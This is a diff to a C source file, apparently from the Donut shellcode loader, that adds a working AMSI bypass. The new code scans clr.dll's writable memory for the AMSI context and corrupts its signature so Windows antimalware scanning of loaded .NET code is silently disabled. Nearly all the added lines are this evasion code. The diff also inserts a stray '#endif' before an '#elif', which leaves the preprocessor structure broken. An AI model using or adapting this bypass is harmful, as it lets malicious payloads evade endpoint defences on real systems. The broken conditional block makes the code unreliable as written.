@@ -31,13 +31,68 @@
 
 #include "bypass.h"
 
-
 #if defined(BYPASS_AMSI_A)
-// This is where you may define your own AMSI bypass.
-// To rebuild with your bypass, modify the makefile to add an option to build with BYPASS_AMSI_A defined.
+// AMSI bypass via CLR context corruption
+// Scans clr.dll writable sections for heap pointers to the AMSI context
+// Corrupts the signature WITHOUT calling VirtualProtect
 BOOL DisableAMSI(PDONUT_INSTANCE inst) {
-  return TRUE;
+    LPVOID clr;
+    PIMAGE_DOS_HEADER dos;
+    PIMAGE_NT_HEADERS nt;
+    PIMAGE_SECTION_HEADER sh;
+    DWORD i, j;
+    PBYTE ds;
+    MEMORY_BASIC_INFORMATION mbi;
+    _PHAMSICONTEXT ctx;
+    BOOL disabled = FALSE;
+
+    // Get base of clr.dll. If not present, this isn't a .NET process yet.
+    clr = inst->api.GetModuleHandleA(inst->clr);
+    if(clr == NULL) return FALSE;
+
+    dos = (PIMAGE_DOS_HEADER)clr;
+    nt = RVA2VA(PIMAGE_NT_HEADERS, clr, dos->e_lfanew);
+    sh = (PIMAGE_SECTION_HEADER)((LPBYTE)&nt->OptionalHeader +
+         nt->FileHeader.SizeOfOptionalHeader);
+
+    // Scan every writable section of clr.dll
+    for(i = 0; i < nt->FileHeader.NumberOfSections && !disabled; i++) {
+        if(sh[i].Characteristics & IMAGE_SCN_MEM_WRITE) {
+            ds = RVA2VA(PBYTE, clr, sh[i].VirtualAddress);
+
+            for(j = 0;
+                j < sh[i].Misc.VirtualSize - sizeof(ULONG_PTR);
+                j += sizeof(ULONG_PTR))
+            {
+                ULONG_PTR ptr = *(ULONG_PTR*)&ds[j];
+
+                // Validate pointer is readable before dereferencing
+                if(inst->api.VirtualQuery((LPVOID)ptr, &mbi, sizeof(mbi)) != sizeof(mbi))
+                    continue;
+
+                // Must be committed, private heap memory, read-write
+                if((mbi.State == MEM_COMMIT) &&
+                   (mbi.Type == MEM_PRIVATE) &&
+                   (mbi.Protect == PAGE_READWRITE))
+                {
+                    ctx = (_PHAMSICONTEXT)ptr;
+
+                    // Check if this structure starts with "AMSI" signature
+                    // inst->amsi is a hashed string, but in the instance it resolves to "AMSI"
+                    if(ctx->Signature == *(PDWORD)inst->amsi) {
+                        // CORRUPT THE SIGNATURE
+                        // This page is already R/W. No VirtualProtect needed.
+                        ctx->Signature++;
+                        disabled = TRUE;
+                        break;
+                    }
+                }
+            }
+        }
+    }
+    return disabled;
 }
+#endif
 
 #elif defined(BYPASS_AMSI_B)
 // fake function that always returns S_OK and AMSI_RESULT_CLEAN
